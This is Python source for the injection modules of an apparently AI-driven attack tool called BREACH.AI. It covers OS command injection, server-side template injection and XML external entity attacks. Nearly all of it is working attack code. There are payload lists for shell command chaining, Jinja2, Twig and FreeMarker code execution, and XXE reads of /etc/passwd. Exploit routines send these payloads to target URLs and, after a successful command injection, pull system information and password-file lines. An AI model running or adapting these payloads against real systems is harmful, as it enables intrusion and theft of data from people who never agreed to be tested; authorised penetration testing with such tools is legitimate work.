"""
BREACH.AI - Injection Attack Modules

Tests for various injection vulnerabilities:
- Command Injection
- Server-Side Template Injection (SSTI)
- XML External Entity (XXE)
"""

import re
from typing import Optional

from breach.attacks.base import AttackResult, InjectionAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.http import HTTPClient, HTTPResponse
from breach.utils.logger import logger


class CommandInjectionAttack(InjectionAttack):
    """Command Injection attack module."""

    name = "Command Injection"
    attack_type = "command_injection"
    description = "Tests for OS command injection"
    severity = Severity.CRITICAL
    owasp_category = "A03:2021 Injection"
    cwe_id = 78

    error_patterns = [
        "command not found",
        "not recognized as an internal",
        "sh:",
        "bash:",
        "/bin/",
        "syntax error",
        "unexpected token",
    ]

    # Command injection payloads
    PAYLOADS = [
        # Basic command chaining
        "; id",
        "| id",
        "|| id",
        "&& id",
        "& id",
        "`id`",
        "$(id)",

        # Windows
        "& whoami",
        "| whoami",
        "; dir",

        # Time-based detection
        "; sleep 5",
        "| sleep 5",
        "& ping -c 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",

        # Output detection
        "; echo BREACHCMD",
        "| echo BREACHCMD",
        "$(echo BREACHCMD)",
        "`echo BREACHCMD`",
    ]

    def get_payloads(self) -> list[str]:
        return self.PAYLOADS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        if not parameter:
            return False

        # Try echo payload
        response = await self._send_payload(url, parameter, "; echo CMDTEST123", method)
        if "CMDTEST123" in response.body:
            return True

        response = await self._send_payload(url, parameter, "| echo CMDTEST123", method)
        if "CMDTEST123" in response.body:
            return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        if not parameter:
            return self._create_result(False, url, parameter)

        result = self._create_result(False, url, parameter)

        for payload in self.PAYLOADS:
            response = await self._send_payload(url, parameter, payload, method)

            # Check for command output
            if "BREACHCMD" in response.body:
                result.success = True
                result.payload = payload
                result.details = "Command injection confirmed"
                result.access_gained = AccessLevel.ROOT
                break

            # Check for command output patterns
            if self._detect_command_output(response.body):
                result.success = True
                result.payload = payload
                result.details = "Command injection (output detected)"
                result.access_gained = AccessLevel.ROOT
                result.data_sample = self._extract_command_output(response.body)
                break

        if result.success:
            # Try to extract system info
            info_payload = payload.replace("id", "uname -a && id && cat /etc/passwd | head -5")
            info_response = await self._send_payload(url, parameter, info_payload, method)
            result.add_evidence("system_info", "System information extracted", info_response.body[:1000])

        return result

    def _detect_command_output(self, body: str) -> bool:
        """Detect command execution output."""
        patterns = [
            r"uid=\d+\(\w+\)",  # Unix id output
            r"Linux \w+",  # uname output
            r"root:x:0:0:",  # /etc/passwd
            r"[A-Z]:\\",  # Windows path
            r"COMPUTERNAME=",  # Windows env
        ]
        return any(re.search(p, body) for p in patterns)

    def _extract_command_output(self, body: str) -> str:
        """Extract command output from response."""
        patterns = [
            r"(uid=\d+\([^)]+\)[^\n]*)",
            r"(Linux [^\n]+)",
            r"(root:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*)",
        ]
        for pattern in patterns:
            match = re.search(pattern, body)
            if match:
                return match.group(1)
        return body[:200]


class SSTIAttack(InjectionAttack):
    """Server-Side Template Injection attack module."""

    name = "Server-Side Template Injection"
    attack_type = "ssti"
    description = "Tests for SSTI vulnerabilities"
    severity = Severity.CRITICAL
    owasp_category = "A03:2021 Injection"
    cwe_id = 94

    error_patterns = [
        "templateerror",
        "jinja2",
        "mako",
        "freemarker",
        "velocity",
        "twig",
        "smarty",
    ]

    # SSTI detection payloads
    DETECTION_PAYLOADS = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("${{7*7}}", "49"),
        ("{{7*'7'}}", "7777777"),
        ("{{config}}", "config"),
    ]

    # Exploitation payloads by template engine
    EXPLOIT_PAYLOADS = {
        "jinja2": [
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        ],
        "twig": [
            "{{_self.env.getFilter('system')}}",
            "{{['id']|filter('system')}}",
        ],
        "freemarker": [
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ],
    }

    def get_payloads(self) -> list[str]:
        return [p[0] for p in self.DETECTION_PAYLOADS]

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        if not parameter:
            return False

        for payload, expected in self.DETECTION_PAYLOADS[:3]:
            response = await self._send_payload(url, parameter, payload, method)
            if expected in response.body:
                return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        if not parameter:
            return self._create_result(False, url, parameter)

        result = self._create_result(False, url, parameter)

        # Detect template engine
        engine = None
        working_payload = None

        for payload, expected in self.DETECTION_PAYLOADS:
            response = await self._send_payload(url, parameter, payload, method)
            if expected in response.body:
                result.success = True
                working_payload = payload

                # Identify engine
                if "{{" in payload and "49" in response.body:
                    engine = "jinja2"
                elif "${" in payload:
                    engine = "freemarker"
                elif "<%=" in payload:
                    engine = "erb"

                break

        if result.success:
            result.payload = working_payload
            result.details = f"SSTI detected (engine: {engine or 'unknown'})"
            result.context["template_engine"] = engine

            # Try exploitation
            if engine and engine in self.EXPLOIT_PAYLOADS:
                for exploit_payload in self.EXPLOIT_PAYLOADS[engine]:
                    response = await self._send_payload(url, parameter, exploit_payload, method)
                    if len(response.body) > 100:
                        result.data_sample = response.body[:500]
                        result.access_gained = AccessLevel.ROOT
                        result.add_evidence("ssti_exploit", f"SSTI exploitation via {engine}", exploit_payload)
                        break

        return result


class XXEAttack(InjectionAttack):
    """XML External Entity attack module."""

    name = "XML External Entity"
    attack_type = "xxe"
    description = "Tests for XXE vulnerabilities"
    severity = Severity.HIGH
    owasp_category = "A05:2017 XXE"
    cwe_id = 611

    error_patterns = [
        "xml parsing error",
        "xmlparseentity",
        "simplexml",
        "lxml",
        "entity",
    ]

    # XXE payloads
    PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    ]

    def get_payloads(self) -> list[str]:
        return self.PAYLOADS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        # Check if endpoint accepts XML
        response = await self.http_client.post(
            url,
            data='<?xml version="1.0"?><test>data</test>',
            headers={"Content-Type": "application/xml"}
        )
        return response.is_success or "xml" in response.body.lower()

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        result = self._create_result(False, url, parameter)

        for payload in self.PAYLOADS:
            response = await self.http_client.post(
                url,
                data=payload,
                headers={"Content-Type": "application/xml"}
            )

            # Check for file content
            if "root:" in response.body or "localhost" in response.body:
                result.success = True
                result.payload = payload[:100] + "..."
                result.details = "XXE: File read successful"
                result.data_sample = response.body[:500]
                result.add_evidence("xxe_file_read", "File content extracted via XXE", response.body[:1000])
                break

        return result
